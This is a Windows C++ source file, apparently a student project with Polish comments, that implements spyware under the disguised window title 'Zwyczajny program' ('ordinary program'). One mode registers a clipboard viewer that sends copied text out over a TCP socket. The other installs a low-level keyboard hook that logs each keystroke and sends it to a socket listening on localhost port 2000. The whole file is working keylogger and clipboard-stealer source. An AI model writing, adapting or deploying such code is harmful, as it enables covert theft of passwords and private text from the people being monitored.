#ifndef UNICODE
#define UNICODE
#endif
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <fstream>
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
using namespace std;

unsigned int total, textCount, bitmapCount, metafilepictCount, sylkCount, difCount, tiffCount, oemtextCount, dibCount, paletteCount;

int uFormat;

long FAR PASCAL WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

static UINT auPriorityList[] = {
		CF_TEXT,
		CF_BITMAP,
		CF_METAFILEPICT,
		CF_SYLK,
		CF_DIF,
		CF_TIFF,
		CF_OEMTEXT,
		CF_DIB,
		CF_PALETTE,
		CF_HDROP
};

bool isCapsLockOn() {

	if ((GetKeyState(VK_CAPITAL) & 0x00001) != 0)
		return true;
	else
		return false;
}


LRESULT CALLBACK KeyboardTrack(int nCode, WPARAM wParam, LPARAM lParam) {

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	static HWND hwndNextViewer;
	HDC hdc;
	PAINTSTRUCT ps;
	HGLOBAL hglb;

	SOCKET s;
	struct sockaddr_in sa;
	WSADATA wsas;
	WORD wersja;
	wersja = MAKEWORD(2, 0);
	WSAStartup(wersja, &wsas);
	s = socket(AF_INET, SOCK_STREAM, 0);
	memset((void*)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(2000);
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
	char storage[1000];

	if (wParam == WM_KEYDOWN) {

		if (p->vkCode >= 0x30 && p->vkCode <= 0x39)
		{
			switch (p->vkCode) {
			case 0x30: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = ')';     
				else  
					storage[0] = '0';        
			break;
			case 0x31: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = '!';     
				else  
					storage[0] = '1';        
				break;
			case 0x32: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = '@';     
				else 
					storage[0] = '2';        break;
			case 0x33: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = '#';     
				else 
					storage[0] = '3';        
				break;
			case 0x34: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = '$';     
				else 
					storage[0] = '4';        
				break;
			case 0x35: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = '%';     
				else 
					storage[0] = '5';        
				break;
			case 0x36: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = '^';     
				else 
					storage[0] = '6';        
				break;
			case 0x37: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = '&';     
				else 
					storage[0] = '7';        
				break;
			case 0x38: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = '*';     
				else 
					storage[0] = '8';        
				break;
			case 0x39: 
				if (GetAsyncKeyState(VK_SHIFT)) 
					storage[0] = '(';     
				else 
					storage[0] = '9';        
				break;
			}
		}

		else if (p->vkCode >= 0x41 && p->vkCode <= 0x5A) // a~z
		{

			if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLockOn()))
				storage[0] = char(tolower(p->vkCode));
			else
				storage[0] = (char)p->vkCode;
		}
		else if (p->vkCode == VK_SPACE)
		{
			storage[0] = ' ';
		}
		else if (p->vkCode == VK_OEM_COMMA)
		{
			if (GetAsyncKeyState(VK_SHIFT))
				storage[0] = '<';
			else
				storage[0] = ',';
		}
		else if (p->vkCode == VK_OEM_PERIOD)
		{
			if (GetAsyncKeyState(VK_SHIFT))
				storage[0] = '.';
			else
				storage[0] = '>';
		}
	}
	if (connect(s, (struct sockaddr FAR*) & sa, sizeof(sa)) == SOCKET_ERROR)
	{
		cout << "Blad polaczenia!";
		return 0;
	}
	while (true)
	{
		if (send(s, storage, 1, 0) == SOCKET_ERROR)
		{
			cout << "Serwer zostal zamkniety" << endl;
			break;
		}
		else
			break;
	}
	closesocket(s);
	WSACleanup();
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

long FAR PASCAL WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{

	static HWND hwndNextViewer;
	HDC hdc;
	PAINTSTRUCT ps;
	HGLOBAL hglb;
	LPSTR text_from_clipboard;

	SOCKET s;
	struct sockaddr_in sa;
	WSADATA wsas;
	WORD wersja;
	wersja = MAKEWORD(2, 0);
	WSAStartup(wersja, &wsas);
	s = socket(AF_INET, SOCK_STREAM, 0);
	memset((void*)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(2000);
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");

	switch (uMsg)
	{
	case WM_PAINT:
		hdc = BeginPaint(hwnd, &ps);
		if (uFormat == CF_TEXT) {
			while (!OpenClipboard(hwnd));
			hglb = GetClipboardData(uFormat);
			text_from_clipboard = (LPSTR)GlobalLock(hglb);

			if (connect(s, (struct sockaddr FAR*) & sa, sizeof(sa)) == SOCKET_ERROR)
			{
				printf("\nBlad polaczenia!");
				return 0;
			}

			int dlugosc_textu;
			char text_storage[2000];
			dlugosc_textu = strlen(text_from_clipboard);
			for (int i = 0; i <= dlugosc_textu; i++) {
				text_storage[i] = text_from_clipboard[i];
			}
			while (true)
			{
				dlugosc_textu = strlen(text_storage);
				dlugosc_textu++;
				if (send(s, text_storage, dlugosc_textu, 0) == SOCKET_ERROR)
				{
					cout << "Serwer zostal zamkniety" << endl;
					break;
				}
				else
					break;
			}
			closesocket(s);
			WSACleanup();
			GlobalUnlock(hglb);
			CloseClipboard();
		}
		break;
	case WM_CREATE:
		hwndNextViewer = SetClipboardViewer(hwnd);
		break;
	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNextViewer);
		PostQuitMessage(0);
		break;
	case WM_DRAWCLIPBOARD:
		uFormat = GetPriorityClipboardFormat(auPriorityList, 4);
		InvalidateRect(hwnd, NULL, TRUE);
		UpdateWindow(hwnd);
		break;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
	return (LRESULT)NULL;
}

int wmain(void)
{
	int opt;
	cin >> opt;

	char title[] = "Zwyczajny program";
	SetConsoleTitleA(title);
	HWND hwndConsole = FindWindowA(NULL, title);
	HINSTANCE hInstance = (HINSTANCE)GetWindowLong(hwndConsole, GWL_HINSTANCE);
	WNDCLASS wc = { 0 };
	wc.hInstance = hInstance;

	if (opt == 1)
	{
		wc.lpfnWndProc = WndProc; //odpalenie machiny schowko-złodzieja
		wc.lpszClassName = TEXT("Zwyczajny program");
		RegisterClass(&wc);
		HWND hwndWindow = CreateWindowW(TEXT("Zwyczajny program"), TEXT("Zwyczajny program"), WS_MINIMIZE, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
		ShowWindow(hwndWindow, SW_SHOWMINIMIZED);
		MSG msg;
		while (GetMessage(&msg, hwndWindow, 0, 0))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		return msg.wParam;
	}
	if (opt == 2)
	{
		HWND hwndWindow = CreateWindowW(TEXT("Zwyczajny program"), TEXT("Zwyczajny program"), WS_MINIMIZE, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
		HHOOK keyBoard = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardTrack, NULL, NULL); //odpalenie machiny keyloggera
		MSG msg;
		while (!GetMessage(&msg, NULL, NULL, NULL)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		UnhookWindowsHookEx(keyBoard);
	}
}

